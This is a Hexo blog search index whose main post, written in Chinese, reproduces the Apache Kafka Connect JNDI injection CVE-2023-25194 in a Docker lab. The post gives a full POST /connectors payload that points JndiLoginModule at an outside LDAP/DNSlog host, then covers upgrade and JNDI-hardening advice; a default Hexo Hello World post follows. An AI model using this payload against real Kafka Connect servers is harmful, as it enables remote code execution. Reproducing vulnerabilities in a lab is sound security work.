<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2023/03/18/Apache_Kafka_Connect_JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20(CVE-2023-25194)%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/03/18/Apache_Kafka_Connect_JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20(CVE-2023-25194)%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-Kafka-Connect-远程代码执⾏漏洞"><a href="#Apache-Kafka-Connect-远程代码执⾏漏洞" class="headerlink" title="Apache Kafka Connect 远程代码执⾏漏洞"></a><strong>Apache Kafka Connect</strong> <strong>远程代码执⾏漏洞</strong></h1><h2 id="1-漏洞受影响版本"><a href="#1-漏洞受影响版本" class="headerlink" title="**1.**漏洞受影响版本"></a>**1.**漏洞受影响版本</h2><p>2.3.0 &lt;&#x3D; Apache Kafka &lt;&#x3D; 3.3.2</p><h2 id="2-漏洞描述"><a href="#2-漏洞描述" class="headerlink" title="**2.**漏洞描述"></a>**2.**漏洞描述</h2><p>Apache Kafka是美国阿帕奇（Apache）基⾦会的⼀套开源的分布式流媒体平台。该平台能够获取实时数据，⽤于构建对数据流的变化进⾏实时反应的应⽤程序。在Apache Kafka Connect 2.3.0到3.3.2的版本中，攻击者可以使⽤基于SASL JAAS配置和SASL协议的任意Kafka客户端，在对Kafka Connect Worker进⾏创建或者修改连接器时，通过构造特殊的配置，进⾏JNDI注⼊，是否能RCE需要看⽬标主机的jdk版本以及是否存在可⽤的利⽤链。连接器（Connector）是用于连接其他数据源的模块，从 2.3.0 版本开始，为了增加连接器的可重用性和可扩展性，用户可修改 kafka 客户端的 SASL JAAS（授权服务） 配置或 SASL-based 安全协议。3.0.0 版本之后，Kafka Connect 标准化了 Kafka 与其他数据系统的集成，用户可方便地对 Kafka Connect 集群中的连接器属性进行配置。默认会在8083端口开启HTTP REST API服务，可对连接器（Connector）的配置进行操作。</p><p><img src="/assets/image-20230216113025491.png" alt="image-20230216113025491"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /connectors 返回一个活动的connect列表</span><br><span class="line">POST /connectors 创建一个新的connect；请求体是一个JSON对象包含一个名称字段和连接器配置参数</span><br><span class="line">GET /connectors/&#123;name&#125; 获取有关特定连接器的信息</span><br><span class="line">GET /connectors/&#123;name&#125;/config 获得特定连接器的配置参数</span><br><span class="line">PUT /connectors/&#123;name&#125;/config 更新特定连接器的配置参数</span><br></pre></td></tr></table></figure><p>连接器中的 Kafka 客户端sasl.jaas.config属性值设置为 com.sun.security.auth.module.JndiLoginModule（通过 producer.override.sasl.jaas.config,consumer.override.sasl.jaas.config或 admin.override.sasl.jaas.config属性进行配置)时，如果连接器连接到攻击者可控的 LDAP 服务器时容易受到反序列化攻击。</p><h3 id="3-漏洞环境"><a href="#3-漏洞环境" class="headerlink" title="**3.**漏洞环境"></a>**3.**漏洞环境</h3><p>⽅式：Docker靶场 <a href="http://192.168.0.105:8083/connectors">http://192.168.0.105:8083/connectors</a></p><p>漏洞组件版本：wurstmeister&#x2F;kafka:2.7.0</p><p>其他组件：wurstmeister&#x2F;zook</p><p>通过docker-compos来进行搭建</p><p>安装docker-compose</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">配置阿里云Docker yum源</span><br><span class="line">[root@xingdian ~]# yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo安装Docker版本</span><br><span class="line">docker 加速</span><br><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://ak7e6zuh.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230215230851795.png" alt="image-20230215230851795"></p><p>通过docker-compose.yaml进行安装容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">version: &#x27;3.7&#x27;</span><br><span class="line">services:</span><br><span class="line">  zookeeper:</span><br><span class="line">    image: wurstmeister/zookeeper</span><br><span class="line">    container_name: zk</span><br><span class="line">    platform: linux/amd64</span><br><span class="line">    ports:</span><br><span class="line">      - 2182:2181</span><br><span class="line"></span><br><span class="line">  kafka:</span><br><span class="line">    image: wurstmeister/kafka:2.13-2.7.0</span><br><span class="line">    container_name: kafka</span><br><span class="line">    platform: linux/amd64</span><br><span class="line">    ports:</span><br><span class="line">      - 9092:9092</span><br><span class="line">      - 8083:8083</span><br><span class="line">    environment:</span><br><span class="line">      KAFKA_BROKER_ID: 0</span><br><span class="line">      KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://:9092</span><br><span class="line">      KAFKA_ZOOKEEPER_CONNECT: zookeeper:2181</span><br><span class="line">      KAFKA_LISTENERS: PLAINTEXT://0.0.0.0:9092</span><br><span class="line">    depends_on:</span><br><span class="line">      - zookeeper</span><br></pre></td></tr></table></figure><p>查看容器并复制文件到容器内</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp debezium-connector-mysql kafka:/opt/kafka/plugins</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Mysql连接器下载地址(注意对应的kafka版本):</span><br><span class="line">https://repo1.maven.org/maven2/io/debezium/debezium-connector-mysql/</span><br></pre></td></tr></table></figure><p><img src="/assets%5Cimage-20230216112202391.png" alt="image-20230216112202391">修改配置文件并打开8083端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/kafka/config/connect-distributed.properties</span><br><span class="line">取消注释#rest.port=8083</span><br><span class="line">在配置⽂件末尾追加</span><br><span class="line">plugin.path=/opt/kafka/plugins</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230216012405572-6515317.png" alt="image-20230216012405572"></p><p>重启 Worker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd opt/kafka</span><br><span class="line">bin/connect-distributed.sh -daemon config/connect-distributed.properties</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230215232100617-6515314.png" alt="image-20230215232100617"></p><p>通过浏览api 接口信息 <a href="http://ip:8083/connector-plugins">http://ip:8083/connector-plugins</a></p><p>如下图，则mysql连接器加载成功。<img src="/assets/image-20230216113135068.png" alt="image-20230216113135068"></p><p>安装mysql数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum install mariadb-server.x86_64 -y   下载数据库</span><br><span class="line">systemctl start mariadb.service启动数据库</span><br><span class="line">ss -antupl |grep &quot;3306&quot;查看是否启动</span><br><span class="line">mysqladmin -u root password &quot;root&quot; 修改密码</span><br><span class="line">grant all on *.* to &#x27;root&#x27;@&#x27;%&#x27; identified by &quot;root&quot;;  对所有地址进行放行</span><br><span class="line">select host,user,password from mysql.user;   </span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST /connectors HTTP/1.1</span><br><span class="line">Host: 192.168.232.130:8083</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 790</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;test133211&quot;,</span><br><span class="line">  &quot;config&quot;: &#123;</span><br><span class="line">    &quot;connector.class&quot;: &quot;io.debezium.connector.mysql.MySqlConnector&quot;,</span><br><span class="line">    &quot;tasks.max&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;database.hostname&quot;: &quot;192.168.232.130&quot;,</span><br><span class="line">    &quot;database.port&quot;: 3306,</span><br><span class="line">&quot;database.history.producer.sasl.jaas.config&quot;: &quot;com.sun.security.auth.module.JndiLoginModule required user.provider.url=\&quot;ldap://1122.5b39e81f.dns.1433.eu.org/ewwe\&quot; useFirstPass=\&quot;true\&quot; serviceName=\&quot;x\&quot; debug=\&quot;true\&quot; group.provider.url=\&quot;xxx\&quot;;&quot;,</span><br><span class="line">    &quot;database.user&quot;: &quot;root&quot;,</span><br><span class="line">&quot;database.history.producer.security.protocol&quot;: &quot;SASL_SSL&quot;,</span><br><span class="line">    &quot;database.password&quot;: &quot;root&quot;,</span><br><span class="line">    &quot;database.server.id&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;database.server.name&quot;: &quot;localhost&quot;,</span><br><span class="line">    &quot;database.history.kafka.bootstrap.servers&quot;: &quot;172.18.0.3:9092&quot;,</span><br><span class="line">    &quot;database.history.kafka.topic&quot;: &quot;dbhistory.config&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230216012653971-6515302.png" alt="image-20230216012653971"></p><p>通过<a href="https://dig.pm/%E5%B9%B3%E5%8F%B0%E6%8E%A5%E6%94%B6">https://dig.pm/平台接收</a></p><p><img src="/assets/image-20230216012709739-6515297.png" alt="image-20230216012709739"></p><h3 id="漏洞建议："><a href="#漏洞建议：" class="headerlink" title="漏洞建议："></a>漏洞建议：</h3><p>将您的Apache Kafka升级至 3.4.0版本及以上，从Apache Kafka 3.4.0开始，我们添加了一个系统属性(“-Dorg.apache.kafka.disallowed.login.modules”)来禁用SASL JAAS配置中有问题的登录模块使用。默认情况下“com.sun.security.auth.module.JndiLoginModule”在 Apache Kafka 3.4.0 中被禁用。我们建议 Kafka Connect 用户验证连接器配置并只允许受信任的 JNDI 配置。还要检查易受攻击版本的连接器依赖项，并升级其连接器、升级特定依赖项或删除连接器作为补救选项。 最后，除了利用“org.apache.kafka.disallowed.login.modules”系统属性外，Kafka Connect用户还可以实现自己的连接器客户端配置覆盖策略，该策略可以用来控制哪些Kafka客户端属性可以直接在连接器配置中覆盖，哪些不能。</p><h2 id="请描述Apache-Kafka无法升级的情况下，有几种方式可以保证Apache-Kafka安全，并详细描述每种方式的具体实现方法。"><a href="#请描述Apache-Kafka无法升级的情况下，有几种方式可以保证Apache-Kafka安全，并详细描述每种方式的具体实现方法。" class="headerlink" title="请描述Apache Kafka无法升级的情况下，有几种方式可以保证Apache Kafka安全，并详细描述每种方式的具体实现方法。"></a>请描述Apache Kafka无法升级的情况下，有几种方式可以保证Apache Kafka安全，并详细描述每种方式的具体实现方法。</h2><h3 id="JNDI分全局配置和私有配置，具体配置详见下面："><a href="#JNDI分全局配置和私有配置，具体配置详见下面：" class="headerlink" title="JNDI分全局配置和私有配置，具体配置详见下面："></a>JNDI分全局配置和私有配置，具体配置详见下面：</h3><p>全局配置:</p><p>需要在项目的META-INF下面建立context.xml文件，在里面写上： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;Context&gt; </span><br><span class="line">  &lt;ResourceLink name=&quot;jdbc/test&quot; global=&quot;jdbc/test&quot; type=&quot;javax.sql.DataSource&quot;/&gt; </span><br><span class="line">&lt;/Context&gt; </span><br></pre></td></tr></table></figure><p>这样就可以在程序里面通过context.lookup(“java:comp&#x2F;env&#x2F;jdbc&#x2F;test”)进行访问了。 </p><p>私有的JNDI有三种方式可以配置： </p><p>   1、可以直接在server.xml里面的<Host>节点下添加如下配置： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;Context path=&quot;/test_tomcat6_jndi&quot;&gt; </span><br><span class="line">&lt;Resource name=&quot;jdbc/test&quot; </span><br><span class="line">   auth=&quot;Container&quot; </span><br><span class="line">       type=&quot;javax.sql.DataSource&quot; </span><br><span class="line">       driverClassName=&quot;com.mysql.jdbc.Driver&quot; </span><br><span class="line">       url=&quot;jdbc:mysql://127.0.0.1/test&quot; </span><br><span class="line">       username=&quot;root&quot; </span><br><span class="line">       password=&quot;root&quot; </span><br><span class="line">       maxActive=&quot;20&quot; </span><br><span class="line">       maxIdle=&quot;10&quot; </span><br><span class="line">       maxWait=&quot;-1&quot;/&gt; </span><br><span class="line">&lt;/Context&gt; </span><br></pre></td></tr></table></figure><p>这样就可以直接在程序中通过context.lookup(“java:comp&#x2F;env&#x2F;jdbc&#x2F;test”)访问了,需要注意的是path&#x3D;”&#x2F;test_tomcat6_jndi”，这个名字必须和你的项目名称相同，而且不能少了那个斜杠，而且你的项目是通过拷贝文件夹到webapps下面的方式进行的部署。 </p><p>   2、 也可以在conf&#x2F;context.xml里面增加如下配置： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;Resource name=&quot;jdbc/test&quot; </span><br><span class="line">   auth=&quot;Container&quot; </span><br><span class="line">       type=&quot;javax.sql.DataSource&quot; </span><br><span class="line">       driverClassName=&quot;com.mysql.jdbc.Driver&quot; </span><br><span class="line">       url=&quot;jdbc:mysql://127.0.0.1/test&quot; </span><br><span class="line">       username=&quot;root&quot; </span><br><span class="line">       password=&quot;root&quot; </span><br><span class="line">       maxActive=&quot;20&quot; </span><br><span class="line">       maxIdle=&quot;10&quot; </span><br><span class="line">       maxWait=&quot;-1&quot;/&gt; </span><br></pre></td></tr></table></figure><p>这样就可以直接在程序中通过context.lookup(“java:comp&#x2F;env&#x2F;jdbc&#x2F;test”)访问了 </p><p>   3、还可以在项目的WebRoot下面的META-INF文件夹下面创建context.xml文件，再在context.xml文件里面写上 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;Context&gt; </span><br><span class="line">  &lt;Resource name=&quot;jdbc/test&quot; </span><br><span class="line"> auth=&quot;Container&quot; </span><br><span class="line">       type=&quot;javax.sql.DataSource&quot; </span><br><span class="line">       driverClassName=&quot;com.mysql.jdbc.Driver&quot; </span><br><span class="line">       url=&quot;jdbc:mysql://127.0.0.1/test&quot; </span><br><span class="line">       username=&quot;root&quot; </span><br><span class="line">       password=&quot;root&quot; </span><br><span class="line">       maxActive=&quot;20&quot; </span><br><span class="line">       maxIdle=&quot;10&quot; </span><br><span class="line">       maxWait=&quot;-1&quot;/&gt; </span><br><span class="line">&lt;/Context&gt; </span><br></pre></td></tr></table></figure><h3 id="针对不同的JDK版本，官方给出了一些限制："><a href="#针对不同的JDK版本，官方给出了一些限制：" class="headerlink" title="针对不同的JDK版本，官方给出了一些限制："></a>针对不同的JDK版本，官方给出了一些限制：</h3><p>1、JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true，表示禁用自动加载远程类文件。</p><p>2、JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项。</p><p>3、JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项</p><h2 id="请描述攻击成功后造成的危害。"><a href="#请描述攻击成功后造成的危害。" class="headerlink" title="请描述攻击成功后造成的危害。"></a>请描述攻击成功后造成的危害。</h2><p>从危害上看，能够导致任意代码执行，属于高风险。</p><p>从业务场景上看，受漏洞影响的通常是基于Kafka Connect提供的：</p><p>数据管道服务（数据迁移、同步）、Kafka相关的测试服务（用于对broker的测试）</p><p>因此主要是云平台类的服务，而大部分Kafka的使用场景不受影响。</p><p>从利用条件上，漏洞要成功用于执行任意代码，需要同时满足： 攻击者可以控制连接器（Connector）的配置、Kafka服务能够访问攻击者控制的LDAP服务（通常需要能访问互联网）、基于远程LDAP引用注入需要java版本小于11.0.1、8u191、7u201、6u211，本地则需要其classpath中加载了可以用于构造利用链的类</p><p>在一般情况下利用成本是较高的。</p><p>因此在漏洞响应排查上，应重点关注基于Kafka的云平台服务、在功能上关注其配置自定义功能。</p><p>建议将kafka-clients 升级至 3.4.0 及以上版本，或通过限制自定义配置的参数临时规避该漏洞风险。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/03/05/hello-world/"/>
      <url>/2023/03/05/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
